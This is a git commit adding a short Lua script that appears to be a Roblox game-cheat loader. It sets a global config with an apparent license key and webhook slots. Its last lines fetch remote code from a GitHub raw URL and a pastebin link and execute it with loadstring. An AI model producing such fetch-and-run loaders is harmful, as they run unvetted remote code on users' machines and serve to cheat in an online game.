f39e7d0d29da40aab1cc3c20b59164328a9d29c0
nutkaitun <book167399@hotmail.com>
2024-07-27 17:20:25 +0700

    Create WindyHub.lua

---
+++ WindyHub.lua
@@ -0,0 +1,13 @@
+repeat task.wait() until game:IsLoaded()
+getgenv().Hermanos_Settings = {
+	['key'] = '76a0fb85-4967-4116-a1c6-56ea0d84c816',
+	['PC'] = '',
+
+	['webhooks'] = {
+		['fullmoon'] = '',
+		['mirage'] = '',
+	}
+}
+task.spawn(function() loadstring(game:HttpGet('https://raw.githubusercontent.com/hermanos-dev/hermanos-script/main/script.lua'))() end)
+
+loadstring(game:HttpGet('https://pastebin.com/raw/pqk7Z5fs'))()
